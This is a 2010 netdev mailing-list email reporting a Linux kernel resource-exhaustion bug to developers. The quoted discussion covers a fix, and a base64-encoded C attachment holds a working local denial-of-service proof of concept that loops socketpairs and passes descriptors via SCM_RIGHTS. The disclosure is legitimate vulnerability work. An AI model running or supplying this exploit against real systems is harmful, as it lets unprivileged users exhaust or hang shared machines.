From: =?UTF-8?B?0JzQsNGA0Log0JrQvtGA0LXQvdCx0LXRgNCz?=
	<socketpair@gmail.com>
Subject: Fwd: Simple kernel attack using socketpair. easy, 100%
 reproductiblle, works under guest. no way to protect :(
Date: Thu, 25 Nov 2010 12:52:13 +0500
Message-ID: <AANLkTin3SAdiRR4eda3SDdDV4XfKTqH5Z0a7Pih2O4jZ@mail.gmail.com>
References: <AANLkTikCeddPFRGojPGuB6oq3xGYgovtm8r4=WhjEDpe@mail.gmail.com>
	<1290666501.2798.84.camel@edumazet-laptop>
	<AANLkTik8Fxmd-KwGw498fMyONfVNteFcfCmz+9-V_QZh@mail.gmail.com>
	<1290668246.2798.93.camel@edumazet-laptop>
	<AANLkTinQa8BCH-k0m=ndu4u8L-kCiD00jYjKvsvoxK2E@mail.gmail.com>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary=0016e6d26c9243b4110495dbe26e
To: netdev@vger.kernel.org
Return-path: <netdev-owner@vger.kernel.org>
Received: from mail-bw0-f46.google.com ([209.85.214.46]:55599 "EHLO
	mail-bw0-f46.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1750997Ab0KYHwO (ORCPT
	<rfc822;netdev@vger.kernel.org>); Thu, 25 Nov 2010 02:52:14 -0500
Received: by bwz15 with SMTP id 15so607962bwz.19
        for <netdev@vger.kernel.org>; Wed, 24 Nov 2010 23:52:13 -0800 (PST)
In-Reply-To: <AANLkTinQa8BCH-k0m=ndu4u8L-kCiD00jYjKvsvoxK2E@mail.gmail.com>
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

--0016e6d26c9243b4110495dbe26e
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

---------- Forwarded message ----------
From: =D0=9C=D0=B0=D1=80=D0=BA =D0=9A=D0=BE=D1=80=D0=B5=D0=BD=D0=B1=D0=B5=
=D1=80=D0=B3 <socketpair@gmail.com>
Date: 2010/11/25
Subject: Re: Simple kernel attack using socketpair. easy, 100%
reproductiblle, works under guest. no way to protect :(
To: Eric Dumazet <eric.dumazet@gmail.com>


2010/11/25 Eric Dumazet <eric.dumazet@gmail.com>:
> Le jeudi 25 novembre 2010 =C3=A0 11:52 +0500, =D0=9C=D0=B0=D1=80=D0=BA =
=D0=9A=D0=BE=D1=80=D0=B5=D0=BD=D0=B1=D0=B5=D1=80=D0=B3 a =C3=A9crit :
>> Well, It seems, that patch likely will fix 100% CPU usage.
>>
>> But what about eating all available descriptors in kernel ? vulnerabilit=
y ?
>>
>
> It doesnt fix cpu usage actually, your program eats 100% of one cpu,
> like the following one :
>
> for (;;) ;
>
> If you want not eat 100% cpu, I suggest you add some blocking calls,
> like usleep(10000)
>
> for (;;) usleep(10000);
>
> Patch only makes sure kernel wont eat too much memory to store inflight
> unix sockets.

I have attached source which proove, that loop not inside this
program, but inside kernel.

--
Segmentation fault



--=20
Segmentation fault

--0016e6d26c9243b4110495dbe26e
Content-Type: text/x-csrc; charset=US-ASCII; name="sp.c"
Content-Disposition: attachment; filename="sp.c"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_ggxcbp2c0

I2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4KI2luY2x1ZGUgPHN5cy91bi5oPgojaW5jbHVkZSA8c3Rk
aW8uaD4KCgpzdGF0aWMgaW50IHNlbmRfZmQgKGludCB1bml4X2ZkLCBpbnQgZmQpCnsKICBzdHJ1
Y3QgbXNnaGRyIG1zZ2g7CiAgc3RydWN0IGNtc2doZHIgKmNtc2c7CiAgY2hhciBidWZbQ01TR19T
UEFDRSAoc2l6ZW9mIChmZCkpXTsKCiAgbWVtc2V0ICgmbXNnaCwgMCwgc2l6ZW9mIChtc2doKSk7
CiAgbWVtc2V0IChidWYsIDAsIHNpemVvZiAoYnVmKSk7CgogIG1zZ2gubXNnX2NvbnRyb2wgPSBi
dWY7CiAgbXNnaC5tc2dfY29udHJvbGxlbiA9IHNpemVvZiAoYnVmKTsKCiAgY21zZyA9IENNU0df
RklSU1RIRFIgKCZtc2doKTsKICBjbXNnLT5jbXNnX2xlbiA9IENNU0dfTEVOIChzaXplb2YgKGZk
KSk7CiAgY21zZy0+Y21zZ19sZXZlbCA9IFNPTF9TT0NLRVQ7CiAgY21zZy0+Y21zZ190eXBlID0g
U0NNX1JJR0hUUzsKCiAgbXNnaC5tc2dfY29udHJvbGxlbiA9IGNtc2ctPmNtc2dfbGVuOwoKICBt
ZW1jcHkgKENNU0dfREFUQSAoY21zZyksICZmZCwgc2l6ZW9mIChmZCkpOwogIHJldHVybiBzZW5k
bXNnICh1bml4X2ZkLCAmbXNnaCwgMCk7Cn0KCgppbnQgbWFpbiAoKQp7CiAgaW50IGZkWzJdLCBm
ZlsyXTsKICBpbnQgdGFyZ2V0OwoKICBpZiAoc29ja2V0cGFpciAoUEZfVU5JWCwgU09DS19TRVFQ
QUNLRVQsIDAsIGZkKSA9PSAtMSkKICAgIHJldHVybiAxOwoKICB3aGlsZSAoc29ja2V0cGFpciAo
UEZfVU5JWCwgU09DS19TRVFQQUNLRVQsIDAsIGZmKSAhPSAtMSkKICB7CiAgICBzZW5kX2ZkIChm
ZlswXSwgZmRbMF0pOwogICAgc2VuZF9mZCAoZmZbMF0sIGZkWzFdKTsKICAgIGNsb3NlIChmZFsx
XSk7CiAgICBjbG9zZSAoZmRbMF0pOwogICAgZmRbMF0gPSBmZlswXTsKICAgIGZkWzFdID0gZmZb
MV07CiAgfQogIHJldHVybiBwcmludGYgKCJUcnkga2lsbCBtZSA6KS4gSGFwcHkga2lsbGluZyA6
KVxuIik7Cn0KCg==
--0016e6d26c9243b4110495dbe26e--
